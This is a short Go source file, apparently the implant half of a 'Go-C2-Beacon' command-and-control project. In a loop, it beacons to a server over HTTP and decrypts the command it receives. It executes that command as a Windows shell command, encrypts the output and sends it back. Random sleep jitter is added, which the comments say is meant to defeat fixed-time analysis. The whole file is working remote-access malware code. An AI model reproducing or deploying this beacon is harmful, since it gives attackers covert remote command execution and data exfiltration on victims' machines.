package main

import (
	"bytes"
	"io"
	"math/rand"
	"net/http"
	"os/exec"
	"time"
	"Go-C2-Beacon/common"
)

func main() {
	serverURL := "http://localhost:8080/login"

	for {
		// 1. Send a Beacon (Signal) to the Server
		resp, err := http.Post(serverURL, "application/octet-stream", bytes.NewBuffer([]byte{}))
		if err == nil {
			// 2. Receive and decrypt the encrypted command from the server.
			encryptedCmd, _ := io.ReadAll(resp.Body)
			decryptedCmd, _ := common.Decrypt(encryptedCmd)

			// 3. Run the Command (e.g., Shell Command)
			cmd := exec.Command("cmd", "/C", string(decryptedCmd)) // for Windows OS
			output, _ := cmd.CombinedOutput()

			// 4. Encrypt the result and send it with the next beacon.
			encryptedResult, _ := common.Encrypt(output)
			http.Post(serverURL, "application/octet-stream", bytes.NewBuffer(encryptedResult))
		}

		// 5. Jitter: Random waiting to disrupt fixed-time analysis.
		jitter := rand.Intn(10) // 0-10 saniye arası rastgele ekle
		time.Sleep(time.Duration(30+jitter) * time.Second)
	}
}
